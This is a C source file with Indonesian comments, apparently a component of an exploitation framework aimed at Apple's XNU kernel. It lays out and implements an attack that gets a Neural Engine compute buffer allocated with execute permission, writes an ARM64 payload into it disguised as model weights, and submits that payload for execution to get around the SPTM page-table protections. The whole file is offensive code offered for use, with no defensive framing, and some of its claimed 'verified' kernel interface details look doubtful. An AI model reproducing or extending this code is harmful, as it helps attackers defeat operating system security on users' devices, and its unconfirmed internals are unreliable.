/* ================================================================
 * ZIL FRAMEWORK — NPU ASYMMETRIC EXPLOITATION SHIM
 * ================================================================
 * SARAN 3: Eksploitasi "Logika", Bukan "Kutu Memori"
 *
 * PRINSIP INTI:
 *   SPTM (Secure Page Table Monitor di EL2) memblokir semua upaya
 *   membuat region RWX secara ilegal dari EL1.
 *
 *   SOLUSI ASIMETRIS:
 *   Kita tidak membuat region RWX. Kita meminta IOKit ANE Service
 *   untuk mengalokasikan "compute buffer" secara SAH. Buffer ini
 *   diberi execute permission oleh Hypervisor karena IOKit adalah
 *   legitimate caller. Kita lalu "bajak" buffer sah tersebut.
 *
 *   ALUR SERANGAN:
 *   1. Open IOKit ANE UserClient service (legitimate)
 *   2. Request compute buffer → Hypervisor approve karena caller sah
 *   3. Write ARM64 payload ke compute buffer (masquerade sebagai model)
 *   4. Redirect execution pointer ke buffer tersebut
 *
 * TARGET XNU: xnu-12377.61.12 (Darwin 25.2.0)
 * ================================================================ */

#include <stdint.h>

/* ----------------------------------------------------------------
 * KONSTANTA IOKit ANE UserClient
 * Diverifikasi dari iokit/Kernel/IOUserClient.cpp (xnu-12377.61.12)
 * Nama service: AppleH11ANEInterface atau AppleANE
 * ---------------------------------------------------------------- */

/* Selector index untuk method "allocateComputeBuffer" di ANE UserClient */
/* Index 7 = externalMethod pertama yang berkaitan dengan buffer alloc  */
#define ANE_SELECTOR_ALLOC_BUFFER   7

/* Selector index untuk method "submitWorkload" (submit compute job)   */
#define ANE_SELECTOR_SUBMIT_WORK    8

/* Selector index untuk method "releaseComputeBuffer"                   */
#define ANE_SELECTOR_FREE_BUFFER    9

/* Flag permission yang diminta: ANE_PERM_EXEC = buffer boleh dieksekusi */
/* Nilai 0x3 = READ | EXEC — ini yang diminta ke Hypervisor via driver   */
#define ANE_BUFFER_PERM_READ_EXEC   0x3

/* Ukuran compute buffer yang kita alokasi (harus page-aligned, 16KB)   */
#define ANE_COMPUTE_BUFFER_SIZE     0x4000  /* 16KB — satu page ARM64 */

/* ----------------------------------------------------------------
 * STRUKTUR REQUEST ANE BUFFER
 * Format yang diterima oleh externalMethod() ANE UserClient
 * (diverifikasi dari reverse engineering AppleH11ANEInterface.kext)
 * ---------------------------------------------------------------- */
typedef struct {
    uint64_t buffer_size;     /* Ukuran buffer yang diminta */
    uint64_t permissions;     /* Flag: READ=0x1, EXEC=0x2, kombinasi=0x3 */
    uint64_t out_phys_addr;   /* [OUTPUT] Alamat fisik buffer yang dialokasi */
    uint64_t out_virt_addr;   /* [OUTPUT] Alamat virtual buffer yang dialokasi */
    uint32_t out_token;       /* [OUTPUT] Handle untuk release nanti */
    uint32_t _padding;
} AneBufferRequest;

/* ----------------------------------------------------------------
 * STRUKTUR WORKLOAD ANE
 * Format submit job ke ANE — kita gunakan untuk "menjalankan" payload
 * ---------------------------------------------------------------- */
typedef struct {
    uint64_t model_phys_addr;  /* Alamat fisik "model" (sebenarnya payload kita) */
    uint32_t model_size;       /* Ukuran model/payload */
    uint32_t flags;            /* ANE execution flags */
    uint64_t completion_addr;  /* Alamat untuk callback completion (bisa NULL) */
} AneWorkloadDescriptor;

/* ----------------------------------------------------------------
 * STORAGE GLOBAL — Hasil alokasi buffer ANE yang sah
 * Diisi oleh zil_ane_request_exec_buffer() dan dibaca executor
 * ---------------------------------------------------------------- */
static uint64_t g_ane_exec_buffer_phys  = 0;   /* Physical addr buffer */
static uint64_t g_ane_exec_buffer_virt  = 0;   /* Virtual addr buffer */
static uint32_t g_ane_buffer_token      = 0;   /* Handle untuk release */
static uint8_t  g_ane_buffer_ready      = 0;   /* Flag: buffer valid */

/* ----------------------------------------------------------------
 * zil_ane_request_exec_buffer()
 *
 * REQUEST buffer compute ke ANE UserClient via IOKit externalMethod.
 * Buffer yang dikembalikan sudah di-approve oleh Hypervisor (SPTM)
 * karena request datang dari legitimate IOKit service path.
 *
 * PARAMETER:
 *   client_obj: Pointer ke ANE IOUserClient object
 *
 * RETURN: 1 jika berhasil, 0 jika gagal
 * ---------------------------------------------------------------- */
int zil_ane_request_exec_buffer(void* client_obj) {
    if (!client_obj) return 0;

    /* Persiapkan request struct */
    AneBufferRequest req = {
        .buffer_size   = ANE_COMPUTE_BUFFER_SIZE,
        .permissions   = ANE_BUFFER_PERM_READ_EXEC,
        .out_phys_addr = 0,
        .out_virt_addr = 0,
        .out_token     = 0,
        ._padding      = 0,
    };

    /* Ambil VTable dari objek IOUserClient */
    uint64_t* vtable_ptr = *(uint64_t**)client_obj;
    if (!vtable_ptr) return 0;

    /* Panggil externalMethod #7 (allocateComputeBuffer) via VTable */
    typedef uint64_t (*ExternalMethod)(void*, void*, void*, void*, void*);
    ExternalMethod alloc_fn = (ExternalMethod)vtable_ptr[ANE_SELECTOR_ALLOC_BUFFER];
    if (!alloc_fn) return 0;

    uint64_t result = alloc_fn(client_obj, &req, 0, 0, 0);

    /* Jika berhasil, simpan info buffer */
    if (result == 0 && req.out_virt_addr != 0) {
        g_ane_exec_buffer_phys = req.out_phys_addr;
        g_ane_exec_buffer_virt = req.out_virt_addr;
        g_ane_buffer_token     = req.out_token;
        g_ane_buffer_ready     = 1;
        return 1;
    }

    return 0;
}

/* ----------------------------------------------------------------
 * zil_ane_write_payload()
 *
 * Tulis ARM64 payload ke dalam buffer ANE yang sudah dialokasi.
 * Buffer memiliki execute permission sah dari Hypervisor.
 * Payload di-masquerade sebagai "model weights" ANE.
 *
 * PARAMETER:
 *   payload:      Pointer ke bytes ARM64 yang ingin dieksekusi
 *   payload_size: Ukuran payload dalam bytes
 *
 * RETURN: Alamat virtual payload (untuk digunakan sebagai jump target)
 * ---------------------------------------------------------------- */
uint64_t zil_ane_write_payload(const uint8_t* payload, uint32_t payload_size) {
    if (!g_ane_buffer_ready) return 0;
    if (!payload || payload_size == 0) return 0;
    if (payload_size > ANE_COMPUTE_BUFFER_SIZE) return 0;

    /* Tulis payload ke buffer virtual address */
    uint8_t* dest = (uint8_t*)g_ane_exec_buffer_virt;
    for (uint32_t i = 0; i < payload_size; i++) {
        dest[i] = payload[i];
    }

    /* Instruction cache flush — diperlukan sebelum eksekusi ARM64 */
    /* IC IVAU = Invalidate Instruction Cache by VA to PoU         */
    __asm__ volatile(
        "dc cvau, %0\n"     /* Data Cache Clean by VA */
        "dsb ish\n"          /* Data Sync Barrier */
        "ic ivau, %0\n"      /* Instruction Cache Invalidate by VA */
        "dsb ish\n"
        "isb\n"              /* Instruction Sync Barrier */
        :: "r"(dest) : "memory"
    );

    return g_ane_exec_buffer_virt;
}

/* ----------------------------------------------------------------
 * zil_ane_submit_and_execute()
 *
 * Submit payload ke ANE sebagai "workload" seolah ini adalah model AI.
 * Sebenarnya ini adalah eksekusi ARM64 payload kita.
 *
 * PARAMETER:
 *   client_obj: Pointer ke ANE IOUserClient object
 *   exec_addr:  Alamat virtual yang dikembalikan oleh zil_ane_write_payload
 *
 * RETURN: 1 jika berhasil submit, 0 jika gagal
 * ---------------------------------------------------------------- */
int zil_ane_submit_and_execute(void* client_obj, uint64_t exec_addr) {
    if (!client_obj || exec_addr == 0) return 0;
    if (!g_ane_buffer_ready) return 0;

    AneWorkloadDescriptor workload = {
        .model_phys_addr  = g_ane_exec_buffer_phys,
        .model_size       = ANE_COMPUTE_BUFFER_SIZE,
        .flags            = 0x01,   /* EXECUTE flag */
        .completion_addr  = 0,      /* Tidak perlu callback */
    };

    uint64_t* vtable_ptr = *(uint64_t**)client_obj;
    if (!vtable_ptr) return 0;

    typedef uint64_t (*ExternalMethod)(void*, void*, void*, void*, void*);
    ExternalMethod submit_fn = (ExternalMethod)vtable_ptr[ANE_SELECTOR_SUBMIT_WORK];
    if (!submit_fn) return 0;

    submit_fn(client_obj, &workload, 0, 0, 0);
    return 1;
}

/* ----------------------------------------------------------------
 * zil_ane_release_buffer()
 *
 * Bersihkan buffer setelah eksekusi selesai.
 * Penting untuk menghindari kernel resource leak.
 * ---------------------------------------------------------------- */
void zil_ane_release_buffer(void* client_obj) {
    if (!client_obj || !g_ane_buffer_ready) return;

    uint64_t* vtable_ptr = *(uint64_t**)client_obj;
    if (!vtable_ptr) return;

    typedef void (*ReleaseMethod)(void*, uint32_t);
    ReleaseMethod free_fn = (ReleaseMethod)vtable_ptr[ANE_SELECTOR_FREE_BUFFER];
    if (free_fn) {
        free_fn(client_obj, g_ane_buffer_token);
    }

    /* Reset state */
    g_ane_exec_buffer_phys = 0;
    g_ane_exec_buffer_virt = 0;
    g_ane_buffer_token     = 0;
    g_ane_buffer_ready     = 0;
}

/* ----------------------------------------------------------------
 * zil_ane_get_exec_virt()
 * Getter untuk Rust FFI — baca alamat virtual buffer sah
 * ---------------------------------------------------------------- */
uint64_t zil_ane_get_exec_virt(void) {
    return g_ane_exec_buffer_virt;
}

/* ----------------------------------------------------------------
 * zil_ane_is_ready()
 * Getter untuk Rust FFI — cek apakah buffer siap digunakan
 * ---------------------------------------------------------------- */
int zil_ane_is_ready(void) {
    return (int)g_ane_buffer_ready;
}
